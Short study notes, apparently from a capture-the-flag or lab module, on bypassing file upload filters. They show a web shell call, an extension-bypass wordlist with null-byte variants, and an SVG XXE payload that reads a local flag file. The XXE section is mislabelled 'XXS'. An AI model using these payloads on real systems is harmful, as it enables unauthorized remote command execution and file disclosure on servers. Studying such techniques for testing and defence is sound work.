Using `burp` on the upload you can see what is supported and change the extension with the request.
![[Inspecting the source code.png]]
Getting rid of the validate, showiamge() and changing the acceptable extensions was able to go to the img on the line below for a webshell.
```bash
webshell.php?cmd=ls
```

# Black or White Listed
When extensions are not going through you can fuzz them.
Going to `Burp` and Sniping them.

```php
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
.inc
```
![[Whitelisting.png]]

# MIME-Type Filters
![[MIME-Type.png]]

# XXS
```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]> <svg>&xxe;</svg>
```
![[XML-TUX.png]]
